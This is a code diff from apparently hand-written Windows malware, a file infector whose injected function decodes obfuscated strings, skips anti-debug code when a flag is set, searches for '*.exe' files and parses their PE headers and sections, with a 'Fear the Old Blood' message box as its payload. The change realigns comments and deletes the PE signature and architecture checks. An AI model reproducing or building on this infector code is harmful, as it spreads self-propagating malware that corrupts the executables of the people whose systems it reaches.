@@ -27,10 +27,10 @@ INJECTED_CODE VOID inj_code_c() {
 #endif  // NO_ANTIDBG
 
     // Declare obfuscated strings for the rest of the function
-    DECLARE_OBFUSCATED(user32, "USER32.DLL");          // DLL to load for MessageBoxA
-    DECLARE_OBFUSCATED(mbTitle, "Yharnam");            // MessageBoxA title
+    DECLARE_OBFUSCATED(user32, "USER32.DLL");              // DLL to load for MessageBoxA
+    DECLARE_OBFUSCATED(mbTitle, "Yharnam");                // MessageBoxA title
     DECLARE_OBFUSCATED(mbText, "~ Fear the Old Blood ~");  // MessageBoxA text
-    DECLARE_OBFUSCATED(exeExt, "*.exe");               // File extension to search for
+    DECLARE_OBFUSCATED(exeExt, "*.exe");                   // File extension to search for
 
 #ifdef PL_DEBUG
     // Declarations for debug strings
@@ -271,16 +271,7 @@ INJECTED_CODE VOID inj_code_c() {
         }
 
         pDosHeader = (PCIMAGE_DOS_HEADER)pMapAddress;
-        if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
-            goto invalid_pe;
-        }
-
         pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)pDosHeader + pDosHeader->e_lfanew);
-        if (pNtHeader->Signature != IMAGE_NT_SIGNATURE ||
-            pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
-            pNtHeader->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
-            goto invalid_pe;
-        }
 
         pSection = IMAGE_FIRST_SECTION(pNtHeader);
         pLastSection = &pSection[wNbSectionsMin1];
